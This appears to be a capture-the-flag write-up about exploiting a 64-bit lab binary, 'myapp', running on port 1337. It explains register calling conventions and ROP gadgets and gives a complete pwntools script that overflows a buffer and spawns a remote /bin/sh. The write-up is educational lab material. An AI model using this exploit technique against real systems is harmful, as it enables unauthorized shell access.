![](./logo.png)

# USER

Looking at the page source we can seen the message

```html
<!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 -->
```

The binary is a `64-bit` application. Therefore, consideration needs to be made for the exploit.

Instead of passing arguments on the stack like a `32-bit` application, `64-bit` applications use registers in the 
order listed below: 
```
+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
|   %rax  | %rdi | %rsi | %rdx | %r10 | %r8  | %r9  |
+---------+------+------+------+------+------+------+
```

### Working exploit

The original call to `system` loads the value of `/usr/bin/uptime` into `rdi`.

In the method `test()` has some interesting gadgets:

```
   0x0000000000401152 <+0>:	push   rbp
   0x0000000000401153 <+1>:	mov    rbp,rsp
   0x0000000000401156 <+4>:	mov    rdi,rsp
   0x0000000000401159 <+7>:	jmp    r13
```

The first two instructions are generic instructions to setup the stack. The one we need is the `mov rdi, rsp`, this can let us load `/bin/sh` into the first instruction register. This will work because `$rsp` will point to the top of the stack. This is where we will place `/bin/sh\x00`.

However, we are followed by a `jmp 13`, this means we need to place the address of `system` into this address to complete the payload. We can achieve this with the gadget `pop r13 ; pop r14 ; pop r15 ; ret`.

Below is our completed exploit:

```python
from pwn import *
import struct
import sys
import re

BINARY = './myapp'
BUFFER_LEN = 120

# io = process(BINARY)
io = remote("10.10.10.147", 1337)
# io = gdb.debug('./myapp', 'b *main+77') # ret of main()

# Gadgets
pop_r13 = p64(0x401206)  # pop r13 ; pop r14 ; pop r15 ; ret
mov_rdi = p64(0x401156)  # mov rdi, rsp

# Addresses
system  = p64(0x40116e)
main    = p64(0x40115f)  # debug

# Data
bin_sh  = b"/bin/sh\x00"

payload =  b""
payload += b"A" * BUFFER_LEN

# pop r13 ; pop r14 ; pop r15 ; ret
payload += pop_r13
payload += system       # r13
payload += b"BBBBBBBB"  # r14
payload += b"BBBBBBBB"  # r15

# mov rdi, rsp
payload += mov_rdi
payload += bin_sh       # /bin/sh\x00

io.sendline(payload)
io.interactive()
```

Note the line:

```python
io = gdb.debug('./myapp', 'b *main+77') # ret of main()
```

Loads the program into `gdb` allows for debugging the `pwn-tools` exploit.

This lets us spawn a shell on the box and grab the `user.txt`!